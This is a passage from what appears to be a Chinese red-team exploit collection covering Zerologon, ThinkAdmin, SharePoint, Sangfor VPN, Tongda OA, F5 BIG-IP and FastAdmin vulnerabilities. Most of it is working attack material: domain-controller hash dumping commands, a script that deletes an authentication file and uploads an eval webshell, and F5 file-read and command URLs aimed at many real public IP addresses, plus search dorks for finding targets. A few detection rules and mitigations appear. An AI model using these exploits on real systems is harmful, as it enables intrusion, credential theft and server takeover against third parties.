<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p><code>git clone https://github.com/SecureAuthCorp/impacket.git</code><br><code>python3 setup.py install</code> //安装impacket</p>
<p>执行脚本</p>
<p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
<p><code>python3 cve-2020-1472-exploit.py owa 192.168.1.104</code></p>
<p>如果利用漏洞成功，则会提示：vulnerable, changing account password to empty string</p>
<p>3、使用impacket的secretsdump.py远程导出域控制上的hash</p>
<p><code>python3 secretsdump.py rootkit.org/owa\$@192.168.1.104 -no-pass</code></p>
<p>4、利用获取到的管理员hash,通过impacket的wmiexec.py来远程操作域控服务器,获取域控的终端命令窗口<br><code>python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13cf6cfe1f2fc41cd286c7c8caec978b</code> <code>rootkit.org/administrator@192.168.1.104</code></p>
<p>5、获取管理员hash，远程连接导出sam数据库中的原来的计算机hash<br><code>reg save HKLM\SYSTEM system.save</code></p>
<p><code>reg save HKLM\SAM sam.save</code></p>
<p><code>reg save HKLM\security security.save get system.save</code></p>
<p><code>get sam.save</code></p>
<p><code>get security.save</code></p>
<p><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL del /f system.save</code></p>
<p><code>del /f sam.save del /f security.save</code></p>
<p>注意：这里会获得一个账号名为：$MACHINE:ACC账号的hash值，注意hash的后半</p>
<p>6、恢复计算机的hash</p>
<p>下载脚本 <a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
<p><code>python3 reinstall_original_pw.py owa 192.168.1.104 ad611ebf4fd2de9448a33ba693b212f4</code>   //注意hash的部分，只有后半部分</p>
<p>如果还原密码成功则会显示：Success! DC machine account should be restored to it&#39;s original value. You might want to secretsdump again to check</p>
<p>7、恢复计算机的hash</p>
<p>使用impacket的脚本来登录域控来验证hash</p>
<p><code>python3 secretsdump.py rootkit.org/administrator:Password1@192.168.1.104 -just-dc-user owa\$</code></p>
<p>使用7步骤的脚本回复hash前</p>
<p><code>python3 reinstall_original_pw.py owa 192.168.1.104 ad611ebf4fd2de9448a33ba693b212f4</code>   //注意hash的部分，只有后半部分<br><code>python restorepassword.py rootkit.org/administrator@192.168.1.104 -target-ip 192.168.1.104 -hexpass aad3b435b51404eeaad3b435b51404ee:13cf6cfe1f2fc41cd286c7c8caec978b</code></p>
<p>通过mimikatz中CVE-2020-1472功能攻击ActiveDirectory的三步骤：</p>
<p>#lsadump::dcsync /domain:LAB.LOCAL /dc:dc.lab.local /user:krbtg t /authuser:dc$  /authdomain:LAB  /authpassword:””  /authntlm<br>#lsadump::zerologon /target:dc.lab.local                   /account:dc$</p>
<p>#lsadump::zerologon /target:dc.lab.local                   /account:dc$ /exploit </p>
<p>#lsadump::dcsync</p>
<p>#lsadump::postzerologon /target:dc.lab.local   /account:dc$           #恢复密码</p>
<p>snort检测规则：</p>
<p>alert tcp any any -&gt; any ![139,445] (msg:”Possible Mimikatz Zerologon Attempt”; flow:established,to_server; content:”|00|”; offse</p>
<p>Windows事件管理器自查：</p>
<p>在未打补丁的域控，重点查看windows事件管理器中，eventid为4742或者4624，5805<br><img src="/image/HW/51.jpg" alt="1"><br>在Windows 8月更新中，新增事件ID 5829，5827，5828，5830，5831。蓝队可以重点关注这几个事件ID以方便自查<br>1.当在初始部署阶段允许存在突破的Netlogon安全通道连接时，将生成事件ID 5829。<br>2.管理员可以监控事件ID 5827和5828，这些事件ID在存在漏洞的Netlogon连接被拒绝时触发<br>3.5830，5831如果“域控制器：允许易受攻击的Netlogon安全通道连接”组策略允许连接。<br>mimikatz通过zerologon攻击成功后，将会留下事件id为4648。<br>参考文献：<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xq6gwgomkE0ru3lR3EmDaw">https://mp.weixin.qq.com/s/xq6gwgomkE0ru3lR3EmDaw</a></p>
<h2 id="ThinkAdminV6-任意文件操作"><a href="#ThinkAdminV6-任意文件操作" class="headerlink" title="ThinkAdminV6 任意文件操作"></a>ThinkAdminV6 任意文件操作</h2><p>Update.php 三个函数未校验访问权限</p>
<p>1、目录遍历注意POST数据包rules参数值需要URL编码</p>
<p><code>POST /admin.html?s=admin/api.Update/node rules=%5B%22.%2F%22%5D</code></p>
<p><img src="/image/HW/52.jpg" alt="1"><br>2、文件读取,后面那一串是UTF8字符串加密后的结果。计算方式在Update.php中的加密函数。<br><code>/admin.html?s=admin/api.Update/get/encode/ 34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34</code><br><img src="/image/HW/53.jpg" alt="1"></p>
<h2 id="CVE-2020-1181：SharePoint远程代码执行"><a href="#CVE-2020-1181：SharePoint远程代码执行" class="headerlink" title="CVE-2020-1181：SharePoint远程代码执行"></a>CVE-2020-1181：SharePoint远程代码执行</h2><p>在演示场景中，我们使用的版本为替代配置的<code>Microsoft SharePoint 2019 Server</code>，安装在<code>Windows Server 2019 Datacenter</code>系统上。服务器主机称为<code>sp2019.contoso.lab</code>，已加入contoso.lab域中，域控制器为一台独立的虚拟机。目标主机已安装终止2020年2月份的所有补丁，因此对应的版本号为<code>16.0.10355.20000</code>。</p>
<p>攻击系统中只需要使用支持的Web浏览器即可。如下图所示，我们使用的浏览器为Mozilla Firefox 69.0.3。我们将使用与前文类似的</p>
<p>WikiContentWebpart，将其命名为WikiContentRCE.xml。<br>1.首先我们访问SharePoint Server，以普通用户（user2）通过身份认证:<br><img src="/image/HW/54.jpg" alt="1"><br><img src="/image/HW/55.jpg" alt="1"><br>2.接下来创建站点，使该用户变成该站点所有者（所有者），具有所有权限。（前提条件普通用户具有创建站点的权限） 点击顶部面板的“ SharePoint”区域：<br><img src="/image/HW/56.jpg" alt="1"><br>然后点击“ +创建网站 ”链接:<br><img src="/image/HW/57.jpg" alt="1"><br>选择“ Team Site ”。现在我们需要为新站点设置名称，这里我们设置为testsiteofuser2。<br><img src="/image/HW/58.jpg" alt="1"><br>点击“ 完成 ”，成功创建新站点:<br><img src="/image/HW/59.jpg" alt="1"><br>现在点击“ Pages ”链接：<br><img src="/image/HW/60.jpg" alt="1"><br>我们需要切换到“ Classic View ”，单击左下角的“ Return to classic SharePoint ”链接即可：<br><img src="/image/HW/61.jpg" alt="1"><br>点击“ + New ”，为新页面设置一个名称。这里我们设置为newpage1：<br><img src="/image/HW/62.jpg" alt="1"><br>点击“ 创建 ”按钮确认。<br><img src="/image/HW/63.jpg" alt="1"><br>现在我们需要在“ INSERT ”标签页中选择“ Web Part ”：<br><img src="/image/HW/64.jpg" alt="1"><br>在上方窗口中，选择左下角的“ Upload Web Part ”链接，上传我们构造的WikiContentRCE.xml文件：<br><img src="/image/HW/65.jpg" alt="1"><br>点击上传。我们可能会看到一个警告弹窗：“确认离开页面？您输入的数据可能不会被保存”。此时点击“ 离开页面 ”按钮即可，返回主编辑视图：<br><img src="/image/HW/66.jpg" alt="1"><br>我们需要再次在INSERT标签页中选择Web部件小部件，其中将出现我们引入的Web部件：<br><img src="/image/HW/67.jpg" alt="1"><br>在点击添加按钮之前，我们先转到目标SharePoint服务器，打开C:\windows\temp目录：<br><img src="/image/HW/68.jpg" alt="1"><br>此时该目录中不存在RCE_PoC.txt文件。<br>现在我们转到攻击者主机，将我们引入的Web Part添加到页面中：<br><img src="/image/HW/69.jpg" alt="1"><br>再次在目标服务器上检查C:\windows\temp目录：<br><img src="/image/HW/70.jpg" alt="1"><br>通过这种方法，攻击者可以执行任意系统命令，入侵服务器。攻击者只需要在WikiContentRCE.xml文件中，将echo pwned &gt; c:/windows/temp/RCE_PoC.txt串联替换成所需的命令即可。</p>
<h2 id="深信服SSL-VPN任意密码重置"><a href="#深信服SSL-VPN任意密码重置" class="headerlink" title="深信服SSL VPN任意密码重置"></a>深信服SSL VPN任意密码重置</h2><p>深信服VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码利用:需要登录账号</p>
<p>M7.6.6R1版本默认key为20181118</p>
<p>M7.6.1版本默认key为20100720 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sangfor_key.py</span><br><span class="line"></span><br><span class="line">from Crypto.Clipher import ARC4 from binascii import a2b_hex</span><br><span class="line"></span><br><span class="line">def myRC4(data,key): rc41&#x3D;ARC4.new(key) encrypted&#x3D;rc41.encrypt(data) return encrypted.encode(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">def rc4_decrpt_hex(data,key): rc41&#x3D;ARC4.new(key)</span><br><span class="line"></span><br><span class="line">return rc41.decrypt(a2b_hex(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key&#x3D;&#39;20200720&#39;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">data&#x3D;r&#39;,username&#x3D;TARGET_USERNAME,ip&#x3D;127.0.0.1,grpid&#x3D;1,pripsw&#x3D;suiyi,newpsw&#x3D;TARGET_PASSWORD,&#39; print myRC4(data,key)</span><br></pre></td></tr></table></figure>
<p><img src="/image/HW/71.jpg" alt="1"><br><code>https://&lt;PATH&gt;/por/changepwd.csp(post)</code></p>
<p><br><code>sessReq=clusterd&amp;sessid=0&amp;str=RC4_STR&amp;len=RC4_STR&amp;len=(脚本计算后结果)</code></br><br><img src="/image/HW/72.jpg" alt="1"></p>
<h2 id="深信服SSL-VPN修改任意账户手机号"><a href="#深信服SSL-VPN修改任意账户手机号" class="headerlink" title="深信服SSL VPN修改任意账户手机号"></a>深信服SSL VPN修改任意账户手机号</h2><p>修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码</p>
<p>利用:需要登录账号</p>
<p><code>https://&lt;PATH&gt;/por/changetelnum.csp?apiversion=1</code> </p>
<p><code>newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</code></p>
<p><img src="/image/HW/73.jpg" alt="1"></p>
<h2 id="通达OA-v11-6版本RCE漏洞"><a href="#通达OA-v11-6版本RCE漏洞" class="headerlink" title="通达OA v11.6版本RCE漏洞"></a>通达OA v11.6版本RCE漏洞</h2><p>一、影响版本</p>
<p>11.6 </p>
<p>二、</p>
<p>复现过程</p>
<p><a target="_blank" rel="noopener" href="http://www.kxdw.com/soft/23114.html">1.下载11.6版本oa，下载地址：http://www.kxdw.com/soft/23114.html</a> </p>
<p>2.安装<br><img src="/image/HW/74.jpg" alt="1"><br><img src="/image/HW/75.jpg" alt="1"><br><img src="/image/HW/76.jpg" alt="1"><br>3.exp脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target&#x3D;&quot;http:&#x2F;&#x2F;ip:port&#x2F;&quot;   &#x2F;&#x2F;此处填写上面安装oa的ip及端口</span><br><span class="line">payload&#x3D;&quot;&lt;?php eval($_POST[&#39;hahaha&#39;]);?&gt;&quot;</span><br><span class="line"></span><br><span class="line">print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;) </span><br><span class="line">input(&quot;Press enter to continue&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;[*]Deleting auth.inc.php....&quot;)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">url&#x3D;target+&quot;&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php?guid&#x3D;..&#x2F;..&#x2F;..&#x2F;webroot&#x2F;inc&#x2F;auth.inc.php&quot; </span><br><span class="line">requests.get(url&#x3D;url)</span><br><span class="line"></span><br><span class="line">print(&quot;[*]Checking if file deleted...&quot;) </span><br><span class="line">url&#x3D;target+&quot;&#x2F;inc&#x2F;auth.inc.php&quot; </span><br><span class="line">page&#x3D;requests.get(url&#x3D;url).text</span><br><span class="line"></span><br><span class="line">if &#39;No input file specified.&#39; not in page: </span><br><span class="line">	print(&quot;[-]Failed to deleted auth.inc.php&quot;) </span><br><span class="line">	exit(-1)</span><br><span class="line"></span><br><span class="line">print(&quot;[+]Successfully deleted auth.inc.php!&quot;) print(&quot;[*]Uploading payload...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url&#x3D;target+&quot;&#x2F;general&#x2F;data_center&#x2F;utils&#x2F;upload.php?action&#x3D;upload&amp;filetype&#x3D;nmsl&amp;repkid&#x3D;&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;&quot; </span><br><span class="line">files &#x3D; &#123;&#39;FILE1&#39;: (&#39;deconf.php&#39;, payload)&#125;</span><br><span class="line"></span><br><span class="line">requests.post(url&#x3D;url,files&#x3D;files) </span><br><span class="line">url&#x3D;target+&quot;&#x2F;_deconf.php&quot; </span><br><span class="line">page&#x3D;requests.get(url&#x3D;url).text</span><br><span class="line"></span><br><span class="line">if &#39;No input file specified.&#39; not in page: </span><br><span class="line">	print(&quot;[+]Filed Uploaded Successfully&quot;) </span><br><span class="line">	print(&quot;[+]URL:&quot;,url)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">	print(&quot;[-]Failed to upload file&quot;) </span><br></pre></td></tr></table></figure>
<p>4.然后执行该exp的效果如下图<br><img src="/image/HW/77.jpg" alt="1"><br>5.用菜刀连接该后门，如下<br><img src="/image/HW/78.jpg" alt="1"><br><a target="_blank" rel="noopener" href="https://github.com/TomAPU/poc_and_exp">https://github.com/TomAPU/poc_and_exp</a> <a target="_blank" rel="noopener" href="https://drivertom.blogspot.com/2019/06/pyspider-webuipocexp.html">https://drivertom.blogspot.com/2019/06/pyspider-webuipocexp.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/13600532.html">https://www.cnblogs.com/yuzly/p/13600532.html</a> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/panisme/p/12560769.html">https://www.cnblogs.com/panisme/p/12560769.html</a></p>
<h2 id="F5负载均衡：cve-2020-5902"><a href="#F5负载均衡：cve-2020-5902" class="headerlink" title="F5负载均衡：cve-2020-5902"></a>F5负载均衡：cve-2020-5902</h2><p>版本影响：</p>
<p>BIG-IP 15.x: 15.1.0/15.0.0<br>BIG-IP 14.x: 14.1.0 ~ 14.1.2<br>BIG-IP 13.x: 13.1.0 ~ 13.1.3<br>BIG-IP 12.x: 12.1.0 ~ 12.1.5<br>BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>
<p>远程命令执行RCE:</p>
<p><code>curl -v -k &#39;https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&#39;</code></p>
<p> <a target="_blank" rel="noopener" href="https://43.247.102.140/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin">https://43.247.102.140/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</a> </p>
<p><a target="_blank" rel="noopener" href="https://43.247.102.142/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin">https://43.247.102.142/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</a><br><img src="/image/HW/79.jpg" alt="1"></p>
<p><img src="/image/HW/80.jpg" alt="1"></p>
<p><img src="/image/HW/81.jpg" alt="1"><br>文 件 包 含 漏 洞 ：<br><code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code><br><code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts</code><br><code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp? fileName=/config/bigip.license</code> <code>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</code> <code>https://183.2.157.179/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://36.110.142.2/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://183.2.157.181/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://58.215.213.226/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://36.110.49.152/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://116.204.216.4/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://116.204.219.3/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://43.247.102.141/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code></p>
<p><code>https://218.205.188.31/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://60.247.99.150/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://36.110.49.151//tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://111.198.181.151/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://220.248.87.92/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://43.247.102.142/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://183.2.157.180/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code> <code>https://43.247.102.140/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code><br><img src="/image/HW/82.jpg" alt="1"><br><img src="/image/HW/83.jpg" alt="1"><br><img src="/image/HW/84.jpg" alt="1"><br>临时修补建议：<br>官方建议可以通过以下步骤临时缓解影响<br>1.使用以下命令登录对应系统tmsh<br>2.编辑 httpd 组件的配置文件<br>edit /sys httpd all-properties</p>
<p>3.文件内容如下<br>include ‘ &lt;LocationMatch “.*..;.*”&gt; Redirect 404 / </LocationMatch> ‘<br>4.按照如下操作保存文件按下 ESC 并依次输入 :wq<br>5.执行命令刷新配置文件save /sys config<br>6.重启 httpd 服务<br>restart sys service httpd<br>7.并禁止外部IP对 TMUI 页面的访问</p>
<p>搜索目标：<br>注：请将下面的%26替换为&amp;。<br>shodan<br>http.favicon.hash:-335242539<br>http.favicon.hash:-335242539 “3992”<br>http.title:”BIG-IP%26reg;- Redirect”<br>http.title:”BIG-IP&reg;- Redirect”</p>
<p>fofa<br>title=”BIG-IP%26reg;- Redirect”</p>
<p>censys 443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb71a17994678692585ee5<br>443.https.get.title:”BIG-IP%26reg;- Redirect”</p>
<p>google inurl:”tmui/login.jsp”<br>intitle:”BIG-IP” inurl:”tmui”<br>登 录 页 面 ：<br>https://<target>/tmui/login.jsp<br>漏洞检测<br>/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp<br>/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=a</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yassineaboukir/CVE-2020-5902">https://github.com/yassineaboukir/CVE-2020-5902</a><br><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2020-5902">https://github.com/jas502n/CVE-2020-5902</a> <a target="_blank" rel="noopener" href="https://github.com/aqhmal/CVE-2020-5902-Scanner">https://github.com/aqhmal/CVE-2020-5902-Scanner</a> <a target="_blank" rel="noopener" href="https://github.com/nsflabs/CVE-2020-5902">https://github.com/nsflabs/CVE-2020-5902</a> <a target="_blank" rel="noopener" href="https://github.com/yasserjanah/CVE-2020-5902">https://github.com/yasserjanah/CVE-2020-5902</a> <a target="_blank" rel="noopener" href="https://github.com/JSec1337/RCE-CVE-2020-5902">https://github.com/JSec1337/RCE-CVE-2020-5902</a> <a target="_blank" rel="noopener" href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p>
<p>suricata CVE-2020-5902 检测规则：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alert http $EXTERNAL_NET any -&gt; any any (msg:&quot;ET EXPLOIT F5 TMUI RCE vulnerability CVE-2020-5902 Attempt&quot;; </span><br><span class="line">flow:established,to_server; </span><br><span class="line">http.uri; content:&quot;&#x2F;tmui&#x2F;login.jsp&#x2F;..|3b|&#x2F;&quot;; depth:20; metadata: former_category EXPLOIT; reference:cve,2020- 5902; reference:url,support.f5.com&#x2F;csp&#x2F;article&#x2F;K52145254; </span><br><span class="line">classtype:attempted-admin; sid:2030469; </span><br><span class="line">rev:3; metadata:affected_product Web_Server_Applications, attack_target Web_Server, deployment Perimeter, signature_severity Critical, created_at 2020_07_05, updated_at 2020_07_05;)</span><br></pre></td></tr></table></figure>
<h2 id="fastadmin前台getshell-csrf-xss"><a href="#fastadmin前台getshell-csrf-xss" class="headerlink" title="fastadmin前台getshell+csrf+xss"></a>fastadmin前台getshell+csrf+xss</h2><p>1.影响版本</p>
<p>V1.0.0.20200506_beta</p>
<p>2.利用限制</p>
<p>/application/config.php文件中:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;是否开启前台会员中心</span><br><span class="line"></span><br><span class="line">&#39;usercenter&#39;</span><br></pre></td></tr></table></figure>

<p>即需要开启会员中心功能为利用前提条件：</p>
<p>3.漏洞位置</p>
<p><code>/application/index/User.php</code>文件</p>
<p>第58-67行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function _empty($name)</span><br><span class="line">&#123;</span><br><span class="line">	$data &#x3D; Hook::listen(&quot;user_request_empty&quot;, $name); </span><br><span class="line">	foreach ($data as $index &#x3D;&gt; $datum) &#123;</span><br><span class="line">		$this-&gt;view-&gt;assign($datum);</span><br><span class="line">	&#125;</span><br><span class="line">	return $this-&gt;view-&gt;fetch(&#39;user&#x2F;&#39; . $name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此方法中的$name参数可控，可导致fetch模板注入</p>
<p>攻击者可以利用该突破性扩展包含指定的路径的后门文件，就可以getshell</p>
<p>3.漏洞验证</p>
<p>登陆会员中心，在个人资料页面中修改个人头像:<br><img src="/image/HW/85.png" alt="1"><br>抓包后修改图片数据（满足图片头格式即可）：<br><img src="/image/HW/86.jpg" alt="1"><br>记录下路径后，成功getshell<br><img src="/image/HW/87.jpg" alt="1"><br>修复建议<br>对传入进来的<code>$name</code>变量做一下过滤</p>
<p>还存在以下漏洞：</p>
<p>后台分类管理处存在xss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> POST &#x2F;admin.php&#x2F;category&#x2F;add?dialog&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line"> Host: admin.com</span><br><span class="line"></span><br><span class="line"> User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line"></span><br><span class="line"> Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line"></span><br><span class="line"> Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line"></span><br><span class="line"> Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line"> Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line"> X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line"> Content-Length: 233</span><br><span class="line"></span><br><span class="line"> Origin: [http:&#x2F;&#x2F;admin.com](http:&#x2F;&#x2F;admin.com&#x2F;)</span><br><span class="line"></span><br><span class="line"> Connection: close</span><br><span class="line"></span><br><span class="line"> Referer: http:&#x2F;&#x2F;admin.com&#x2F;admin.php&#x2F;category&#x2F;add?dialog&#x3D;1</span><br><span class="line"></span><br><span class="line"> Cookie: PHPSESSID&#x3D;ou6fjfn717lu02rfm9saqguca4; uid&#x3D;3; token&#x3D;f824ac8c-ac7b-4979-a89b-b47dd8e79226</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">row%5Btype%5D&#x3D;default&amp;row%5Bpid%5D&#x3D;0&amp;row%5Bname%5D&#x3D;%3Cscript%3Ealert(1)%3C%2Fscript%3E&amp;row%5Bnickname%5D&#x3D;123&amp;row%5Bimage%5D&#x3D;1&amp;row%5Bkeywords%5D&#x3D;123&amp;row%5Bde</span><br></pre></td></tr></table></figure>
<p><img src="/image/HW/88.jpg" alt="1"><br>且存在csrf漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;admin.com&#x2F;admin.php&#x2F;category&#x2F;add?dialog&#x3D;1&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;type&amp;#93;&quot; value&#x3D;&quot;default&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;pid&amp;#93;&quot; value&#x3D;&quot;0&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;name&amp;#93;&quot; value&#x3D;&quot;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;&amp;#47;script&gt;&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;nickname&amp;#93;&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;image&amp;#93;&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;keywords&amp;#93;&quot; 